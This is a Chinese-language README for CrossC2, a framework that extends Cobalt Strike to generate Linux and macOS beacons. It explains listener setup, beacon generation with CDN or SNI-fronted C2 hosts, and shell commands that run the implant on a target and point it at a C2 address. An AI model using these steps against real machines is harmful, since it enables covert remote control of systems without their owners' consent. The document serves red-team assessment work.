# CrossC2 framework

[![ Linux ](https://svgshare.com/i/Zhy.svg)](https://svgshare.com/i/Zhy.svg)
[![ macOS ](https://svgshare.com/i/ZjP.svg)](https://svgshare.com/i/ZjP.svg)
[![GitHub issues-closed](https://img.shields.io/github/issues-closed/gloxec/CrossC2.svg)](https://GitHub.com/gloxec/CrossC2/issues?q=is%3Aissue+is%3Aclosed)
[![Release](https://img.shields.io/github/release/gloxec/CrossC2.svg)](https://github.com/gloxec/CrossC2/releases/latest)
[![Downloads](https://img.shields.io/github/downloads/gloxec/CrossC2/total?label=Release%20Download)](https://github.com/gloxec/CrossC2/releases/latest)



<p align="center">
  <img alt="CrossC2 Logo" src="media/16292585578533/CrossC2_logo.png" height="30%" width="30%">
</p>


[README](README.md) | [中文文档](README_zh.md) | [README_FULL](README_full.md) | [中文完整文档](README_zh_full.md) 


# CobaltStrike 支持说明

支持CobaltStrike对其他平台(Linux/MacOS/...)的安全评估，及包含Unix后渗透模块开发支持

|                 | CS3.14(bug fixes) | CS4.0 | CS4.X (>=4.1) |
|-----------------|----------|-------|---------------|
| Master分支        | ✅        |       |               |
| cs4.0分支         |          | ✅     |               |
| cs4.1分支         |          |       | ✅             |
|                 |          |       |               |
| Release 页面 <= v2.1 | ✅        |       |               |
| Release 页面 >= v2.2 |          |       | ✅             |

# Usage

> 1. 下载

下载**CrossC2.cna** **genCrossC2** **CrossC2Kit**, 修改`CrossC2.cna`配置

> 2. 创建listener与拷贝key

* 创建`windows/beacon_https/reverse_https` listener
* 拷贝**teamserver目录**的 `.cobaltstrike.beacon_keys`到**本地**

> 3. 功能扩展

* 添加`CrossC2Kit_Loader.cna`, 包含内存加载等其它功能
* `cs4.x`版本文件管理、进程列表功能缺失，必须使用此Loader来重启

> 4. 生成beacon

默认使用cli或cna提供的GUI功能生成beacon

* 当teamserver配置了c2profile时，需要提前生成rebind库供生成beacon时使用
* 当使用转发方式时, 除了指定rebind库外，生成时同样需要注意C2_HOST字段:
    * 服务商使用HTTP请求内容进行校验类型时，需指定CDN IP列表: `genCrossC2 1.1.1.1,2.2.2.2,3.3.3.3,xxx.xxx.xxx.xx ...`
    * 当CDN服务器通过SNI进行校验时，如Cloudflare等CDN运行商，需指定CDN绑定的域名: `genCrossC2 c2.domain.com ...`

rebind库相关介绍: 
* [📖wiki](https://gloxec.github.io/CrossC2/zh_cn/protocol/)
* Demo: 
    * C2Profile demo [📄demo_c2profile.profile](https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/https.profile) [📄demo_c2profil_rebind.c](https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/c2profile.c) 
    * UDP通信 demo [📄demo_udp_proxy_server.c](https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/proxy_udp.py) [📄demo_udp_rebind.c](https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/rebind_udp.c)
* Issues: [🏷issue #65 (数据传递与c2profile字段对应示例)](https://github.com/gloxec/CrossC2/issues/65)、[🏷issue #89 (数据处理示例)](https://github.com/gloxec/CrossC2/issues/89#issuecomment-861194022)

> 5. 运行beacon

* 在目标上运行CrossC2插件生成的一键上线脚本
* 上传beacon至目标机器后进行赋权运行
* 为beacon设定工作目录并运行: `export CCPATH=/opt/ && /tmp/c2`
* 为beacon临时指定协议库并运行: `/tmp/c2 /tmp/c2-rebind.so`
* 为beacon临时设定C2配置: `export CCHOST=127.0.0.1 && export CCPORT=443 && /tmp/c2`
* 设定DEBUG查看beacon上线状态: `export CCDEBUG=1 && /tmp/c2`

# 提示

`仅做企业、组织内部自身使用，本框架具有一定脆弱性，非专业人员请勿使用，以及禁止用于非法用途及盈利等，否则造成经济损失等问题自行承担并追究其相关责任!`

# todo

1. http-proxy (auth) & socks 代理回连支持
5. node beacon? (单个节点式，可进行不依靠teamserver托管其他beacon)
6. Linux & MacOS 端so/dylib的上线支持、及其衍生的进程注入等功能

# 感谢

感谢 **@Emma** 为CrossC2设计的Logo, 沿用 **Armitage** 、**CobaltStrike** 系列风格进行设计